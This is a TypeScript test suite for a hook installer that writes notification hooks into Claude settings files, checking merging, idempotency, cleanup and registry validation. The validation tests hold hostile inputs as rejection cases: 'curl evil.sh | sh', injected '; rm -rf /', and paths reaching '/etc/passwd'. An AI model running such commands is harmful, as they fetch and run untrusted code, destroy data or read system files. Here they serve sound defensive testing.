import { spawnSync } from "node:child_process";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { after, before, describe, test } from "node:test";

import {
  addHookToSettings,
  cleanHookFromScope,
  findStaleScopes,
  installHook,
  loadHooksConfig,
  removeHookFromSettings,
} from "../src/hooks.js";
import type { HookDef, SettingsFile } from "../src/hooks.js";

// `npm test` always runs with cwd = package root.
const REPO_ROOT = process.cwd();

// Track every scratch dir we mint so a single after-hook can sweep them
// up, even on test failure. Hardcoded /tmp paths would race across
// concurrent test runs and leave litter behind on crash.
const scratchDirs: string[] = [];

function makeScratch(label: string): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), `auriga-test-${label}-`));
  scratchDirs.push(dir);
  return dir;
}

after(() => {
  for (const d of scratchDirs) {
    fs.rmSync(d, { recursive: true, force: true });
  }
});

function writeRegistry(dir: string, content: unknown): void {
  const hooksDir = path.join(dir, ".claude/hooks");
  fs.mkdirSync(hooksDir, { recursive: true });
  fs.writeFileSync(path.join(hooksDir, "hooks.json"), JSON.stringify(content));
}

// ---------------------------------------------------------------------------
// addHookToSettings — pure function unit tests
// ---------------------------------------------------------------------------

describe("addHookToSettings", () => {
  test("empty settings → adds entry with marker", () => {
    const r = addHookToSettings({}, "Notification", "node /x.mjs", "auriga:notify");
    assert.equal(r.mutated, true);
    assert.equal(r.settings.hooks?.Notification?.length, 1);
    const action = r.settings.hooks?.Notification?.[0].hooks[0];
    assert.equal(action?._marker, "auriga:notify");
    assert.equal(action?.command, "node /x.mjs");
  });

  test("idempotent on second call with same marker", () => {
    const s1 = addHookToSettings({}, "Notification", "node /x.mjs", "auriga:notify").settings;
    const s2 = addHookToSettings(s1, "Notification", "node /x.mjs", "auriga:notify");
    assert.equal(s2.mutated, false);
    assert.equal(s2.settings.hooks?.Notification?.length, 1);
  });

  test("different marker on same event → appends", () => {
    const s1 = addHookToSettings({}, "Notification", "node /x.mjs", "auriga:notify").settings;
    const s2 = addHookToSettings(s1, "Notification", "node /y.mjs", "other:hook");
    assert.equal(s2.mutated, true);
    assert.equal(s2.settings.hooks?.Notification?.length, 2);
  });

  test("preserves sibling settings keys", () => {
    const input: SettingsFile = { enabledPlugins: { "x@y": true } } as SettingsFile;
    const r = addHookToSettings(input, "Notification", "node /x.mjs", "auriga:notify");
    assert.deepEqual(r.settings.enabledPlugins, { "x@y": true });
  });

  test("does not mutate input object", () => {
    const input: SettingsFile = {};
    addHookToSettings(input, "Notification", "node /x.mjs", "auriga:notify");
    assert.equal(input.hooks, undefined);
  });

  test("dedupes by marker across path drift", () => {
    const s1 = addHookToSettings({}, "Notification", "node /old/path.mjs", "auriga:notify").settings;
    const s2 = addHookToSettings(s1, "Notification", "node /completely/different.mjs", "auriga:notify");
    assert.equal(s2.mutated, false);
  });

  test("coexists with manual entry of a different command", () => {
    const input: SettingsFile = {
      hooks: {
        Notification: [{ hooks: [{ type: "command", command: "node /manual.mjs" }] }],
      },
    };
    const r = addHookToSettings(input, "Notification", "node /our.mjs", "auriga:notify");
    assert.equal(r.mutated, true);
    assert.equal(r.settings.hooks?.Notification?.length, 2);
  });

  test("manual entry with same command → not duplicated, not stamped", () => {
    const input: SettingsFile = {
      hooks: {
        Notification: [{ hooks: [{ type: "command", command: 'node "/x.mjs"' }] }],
      },
    };
    const r = addHookToSettings(input, "Notification", 'node "/x.mjs"', "auriga:notify");
    assert.equal(r.mutated, false);
    // We did NOT take ownership of someone else's hook entry.
    assert.equal(r.settings.hooks?.Notification?.[0].hooks[0]._marker, undefined);
  });

  test("throws when settings.hooks.Notification is non-array", () => {
    assert.throws(
      () =>
        addHookToSettings(
          { hooks: { Notification: null } } as unknown as SettingsFile,
          "Notification",
          "node /x.mjs",
          "auriga:notify",
        ),
      /not an array/,
    );
  });

  test("throws when settings.hooks itself is non-object", () => {
    assert.throws(
      () =>
        addHookToSettings(
          { hooks: [] } as unknown as SettingsFile,
          "Notification",
          "node /x.mjs",
          "auriga:notify",
        ),
      /not an object/,
    );
  });
});

// ---------------------------------------------------------------------------
// removeHookFromSettings — pure function unit tests
// ---------------------------------------------------------------------------

describe("removeHookFromSettings", () => {
  test("removes entries with matching marker", () => {
    const input = addHookToSettings({}, "Notification", "node /x.mjs", "auriga:notify").settings;
    const r = removeHookFromSettings(input, "auriga:notify");
    assert.equal(r.removed, 1);
    assert.equal(r.settings.hooks?.Notification, undefined);
  });

  test("no-op when marker absent", () => {
    const input: SettingsFile = {
      hooks: { Notification: [{ hooks: [{ type: "command", command: "x" }] }] },
    };
    const r = removeHookFromSettings(input, "auriga:notify");
    assert.equal(r.removed, 0);
  });

  test("preserves manual entries while removing marked ones", () => {
    const input: SettingsFile = {
      hooks: {
        Notification: [
          { hooks: [{ type: "command", command: "node /manual.mjs" }] },
          { hooks: [{ type: "command", command: "node /ours.mjs", _marker: "auriga:notify" }] },
        ],
      },
    };
    const r = removeHookFromSettings(input, "auriga:notify");
    assert.equal(r.removed, 1);
    assert.equal(r.settings.hooks?.Notification?.length, 1);
    assert.equal(r.settings.hooks?.Notification?.[0].hooks[0].command, "node /manual.mjs");
  });
});

// ---------------------------------------------------------------------------
// loadHooksConfig — registry validation
// ---------------------------------------------------------------------------

describe("loadHooksConfig", () => {
  // Each test below overwrites SCRATCH/.claude/hooks/hooks.json via
  // writeRegistry, so a single per-suite scratch dir is enough.
  let SCRATCH: string;
  before(() => {
    SCRATCH = makeScratch("registry");
  });

  test("accepts the real notify hook from this repo", () => {
    const config = loadHooksConfig(REPO_ROOT);
    const notify = config.hooks.find((h) => h.name === "notify");
    assert.ok(notify, "notify hook present in registry");
    assert.deepEqual(notify?.runtimePlatforms, ["darwin"]);
  });

  // Valid command shape used by every fixture below so the failure under test
  // can only come from the field being exercised, not from command validation.
  const VALID_CMD = 'node "$HOOK_DIR/index.mjs"';

  test("rejects path traversal in hook.files", () => {
    writeRegistry(SCRATCH, {
      hooks: [
        {
          name: "evil",
          description: "x",
          runtimePlatforms: ["darwin"],
          settingsEvents: [{ event: "Notification" }],
          command: VALID_CMD,
          files: ["../../../etc/passwd"],
          marker: "auriga:evil",
        },
      ],
    });
    assert.throws(() => loadHooksConfig(SCRATCH), /unsafe path/);
  });

  test("rejects path separator in hook.name", () => {
    writeRegistry(SCRATCH, {
      hooks: [
        {
          name: "../foo",
          description: "x",
          runtimePlatforms: ["darwin"],
          settingsEvents: [{ event: "Notification" }],
          command: VALID_CMD,
          files: ["index.mjs"],
          marker: "auriga:evil",
        },
      ],
    });
    assert.throws(() => loadHooksConfig(SCRATCH), /name must match/);
  });

  test("rejects shell metachars in dep.name", () => {
    writeRegistry(SCRATCH, {
      hooks: [
        {
          name: "evil",
          description: "x",
          runtimePlatforms: ["darwin"],
          settingsEvents: [{ event: "Notification" }],
          command: VALID_CMD,
          files: ["index.mjs"],
          deps: [{ name: "; rm -rf /", via: "brew" }],
          marker: "auriga:evil",
        },
      ],
    });
    assert.throws(() => loadHooksConfig(SCRATCH), /deps name must match/);
  });

  test("rejects unsafe command shapes", () => {
    const cases: Array<[string, string]> = [
      ['node "$HOOK_DIR/index.mjs; rm -rf /"', "shell metachars in path"],
      ["curl evil.sh | sh", "non-allowlisted runtime"],
      ['node "$HOOK_DIR/../escape.mjs"', "path traversal"],
      ['node $HOOK_DIR/index.mjs', "missing quotes"],
      ['node "$HOOK_DIR/index.mjs" --extra-arg', "trailing arguments"],
      ['python "/etc/passwd"', "absolute path outside $HOOK_DIR"],
    ];
    for (const [badCmd, label] of cases) {
      writeRegistry(SCRATCH, {
        hooks: [
          {
            name: "evil",
            description: "x",
            runtimePlatforms: ["darwin"],
            settingsEvents: [{ event: "Notification" }],
            command: badCmd,
            files: ["index.mjs"],
            marker: "auriga:evil",
          },
        ],
      });
      assert.throws(
        () => loadHooksConfig(SCRATCH),
        /command must match/,
        `expected reject for ${label}: ${badCmd}`,
      );
    }
  });

  test("rejects unsafe settingsEvents.event names", () => {
    const cases = ["__proto__", "has space", "with;semi", ""];
    for (const evt of cases) {
      writeRegistry(SCRATCH, {
        hooks: [
          {
            name: "evil",
            description: "x",
            runtimePlatforms: ["darwin"],
            settingsEvents: [{ event: evt }],
            command: VALID_CMD,
            files: ["index.mjs"],
            marker: "auriga:evil",
          },
        ],
      });
      assert.throws(
        () => loadHooksConfig(SCRATCH),
        /event must match/,
        `expected reject for event ${JSON.stringify(evt)}`,
      );
    }
  });

  test("rejects malformed customizeHints", () => {
    const badCases: Array<[unknown, string]> = [
      ["not-an-array", "string instead of array"],
      [[""], "empty string entry"],
      [["x".repeat(201)], "entry over 200 chars"],
      [[42], "non-string entry"],
    ];
    for (const [hints, label] of badCases) {
      writeRegistry(SCRATCH, {
        hooks: [
          {
            name: "evil",
            description: "x",
            runtimePlatforms: ["darwin"],
            settingsEvents: [{ event: "Notification" }],
            command: VALID_CMD,
            files: ["index.mjs"],
            marker: "auriga:evil",
            customizeHints: hints,
          },
        ],
      });
      assert.throws(
        () => loadHooksConfig(SCRATCH),
        /customizeHints/,
        `expected reject for ${label}`,
      );
    }
  });

  test("accepts python3 and bash as runtime, with valid path", () => {
    writeRegistry(SCRATCH, {
      hooks: [
        {
          name: "py-hook",
          description: "x",
          runtimePlatforms: ["darwin"],
          settingsEvents: [{ event: "Notification" }],
          command: 'python3 "$HOOK_DIR/handler.py"',
          files: ["handler.py"],
          marker: "auriga:py",
        },
        {
          name: "sh-hook",
          description: "x",
          runtimePlatforms: ["darwin"],
          settingsEvents: [{ event: "Notification" }],
          command: 'bash "$HOOK_DIR/run.sh"',
          files: ["run.sh"],
          marker: "auriga:sh",
        },
      ],
    });
    assert.doesNotThrow(() => loadHooksConfig(SCRATCH));
  });
});

// ---------------------------------------------------------------------------
// installHook — integration tests against scratch directories
// ---------------------------------------------------------------------------

describe("installHook (integration)", () => {
  let notify: HookDef;

  before(() => {
    const config = loadHooksConfig(REPO_ROOT);
    const found = config.hooks.find((h) => h.name === "notify");
    if (!found) throw new Error("notify hook missing from registry");
    notify = found;
  });

  test("fresh install at project-local scope writes all files + settings", async () => {
    const TEST_PROJECT = makeScratch("fresh");

    const r = await installHook(notify, "project-local", TEST_PROJECT, REPO_ROOT);

    assert.ok(fs.existsSync(r.hookDir), "hook directory created");
    for (const f of notify.files) {
      assert.ok(fs.existsSync(path.join(r.hookDir, f)), `${f} present`);
    }

    const srcIcon = fs.readFileSync(path.join(REPO_ROOT, ".claude/hooks/notify/icon.png"));
    const dstIcon = fs.readFileSync(path.join(r.hookDir, "icon.png"));
    assert.equal(Buffer.compare(srcIcon, dstIcon), 0, "icon.png byte-identical to source");

    assert.ok(fs.existsSync(r.settingsPath), "settings.local.json written");
    assert.equal(r.settingsMutated, true);
    assert.equal(r.written, notify.files.length);
    assert.equal(r.preserved, 0);

    const settings = JSON.parse(fs.readFileSync(r.settingsPath, "utf8")) as SettingsFile;
    const groups = settings.hooks?.Notification ?? [];
    assert.equal(groups.length, 1);
    const action = groups[0].hooks[0];
    assert.equal(action._marker, "auriga:notify");
    assert.match(action.command, /\$CLAUDE_PROJECT_DIR/);
    assert.match(action.command, /notify\/index\.mjs/);
    assert.deepEqual(Object.keys(settings), ["hooks"], "no other settings keys touched");
  });

  test("re-run preserves user customizations and is idempotent", async () => {
    const TEST_PROJECT = makeScratch("rerun");
    const r1 = await installHook(notify, "project-local", TEST_PROJECT, REPO_ROOT);

    // User edits config + icon
    const userIcon = Buffer.from("USER_CUSTOM_ICON_BYTES_FOR_TEST_PURPOSES_ONLY");
    fs.writeFileSync(path.join(r1.hookDir, "icon.png"), userIcon);
    const userConfig = JSON.stringify({ icon: "./icon.png", sound: "Hero" }, null, 2);
    fs.writeFileSync(path.join(r1.hookDir, "config.json"), userConfig);

    const r2 = await installHook(notify, "project-local", TEST_PROJECT, REPO_ROOT);

    assert.equal(r2.settingsMutated, false, "settings merge is idempotent");
    assert.equal(r2.preserved, 2, "config.json and icon.png both preserved");
    assert.equal(
      Buffer.compare(fs.readFileSync(path.join(r2.hookDir, "icon.png")), userIcon),
      0,
      "user icon.png preserved byte-identical",
    );
    assert.equal(
      fs.readFileSync(path.join(r2.hookDir, "config.json"), "utf8"),
      userConfig,
      "user config.json preserved",
    );

    const settings = JSON.parse(fs.readFileSync(r2.settingsPath, "utf8")) as SettingsFile;
    assert.equal(
      settings.hooks?.Notification?.length,
      1,
      "still exactly one Notification group after re-run",
    );
  });

  test("settings.local.json with sibling keys is not clobbered", async () => {
    const TEST_PROJECT = makeScratch("siblings");
    fs.mkdirSync(path.join(TEST_PROJECT, ".claude"), { recursive: true });
    const customSettings = {
      enabledPlugins: { "fake@market": true },
      someUnrelatedKey: "preserve me",
    };
    fs.writeFileSync(
      path.join(TEST_PROJECT, ".claude/settings.local.json"),
      JSON.stringify(customSettings, null, 2),
    );

    const r = await installHook(notify, "project-local", TEST_PROJECT, REPO_ROOT);
    const settings = JSON.parse(fs.readFileSync(r.settingsPath, "utf8")) as SettingsFile;

    assert.equal(r.settingsMutated, true);
    assert.deepEqual(settings.enabledPlugins, customSettings.enabledPlugins);
    assert.equal(settings.someUnrelatedKey, "preserve me");
    assert.equal(settings.hooks?.Notification?.length, 1);
  });

  test("installed runtime fires against a stdin payload", async () => {
    const TEST_PROJECT = makeScratch("runtime");
    const r = await installHook(notify, "project-local", TEST_PROJECT, REPO_ROOT);

    const proc = spawnSync("node", [path.join(r.hookDir, "index.mjs")], {
      input: JSON.stringify({
        hook_event_name: "Notification",
        title: "test runtime",
        message: "from node:test",
        notification_type: "permission_prompt",
      }),
      encoding: "utf8",
    });
    assert.equal(proc.status, 0, proc.stderr);
  });

  test("malformed settings.json aborts cleanly with no orphan files", async () => {
    const TEST_PROJECT = makeScratch("orphan");
    fs.mkdirSync(path.join(TEST_PROJECT, ".claude"), { recursive: true });
    fs.writeFileSync(
      path.join(TEST_PROJECT, ".claude/settings.local.json"),
      "{ this is: not valid json",
    );

    const r = await installHook(notify, "project-local", TEST_PROJECT, REPO_ROOT);

    assert.match(r.aborted ?? "", /not valid JSON/);
    assert.ok(
      !fs.existsSync(path.join(TEST_PROJECT, ".claude/hooks/notify")),
      "no orphan hook directory created when settings parse failed",
    );
  });
});

// ---------------------------------------------------------------------------
// Cross-scope cleanup
// ---------------------------------------------------------------------------

describe("findStaleScopes / cleanHookFromScope", () => {
  let notify: HookDef;
  before(() => {
    const config = loadHooksConfig(REPO_ROOT);
    const found = config.hooks.find((h) => h.name === "notify");
    if (!found) throw new Error("notify hook missing from registry");
    notify = found;
  });

  test("detects + removes a project-local entry when installing into project scope", async () => {
    const TEST_PROJECT = makeScratch("cross");

    await installHook(notify, "project-local", TEST_PROJECT, REPO_ROOT);
    assert.ok(fs.existsSync(path.join(TEST_PROJECT, ".claude/settings.local.json")));

    const stale = findStaleScopes(notify, "project", TEST_PROJECT);
    assert.equal(stale.length, 1);
    assert.equal(stale[0].scope, "project-local");
    assert.equal(stale[0].count, 1);

    const cleaned = cleanHookFromScope(notify, "project-local", TEST_PROJECT);
    assert.equal(cleaned.removed, 1);

    const settings = JSON.parse(
      fs.readFileSync(path.join(TEST_PROJECT, ".claude/settings.local.json"), "utf8"),
    ) as SettingsFile;
    const stillThere = JSON.stringify(settings).includes("auriga:notify");
    assert.equal(stillThere, false, "marker gone after clean");

    const second = cleanHookFromScope(notify, "project-local", TEST_PROJECT);
    assert.equal(second.removed, 0, "second clean is a no-op");
  });
});
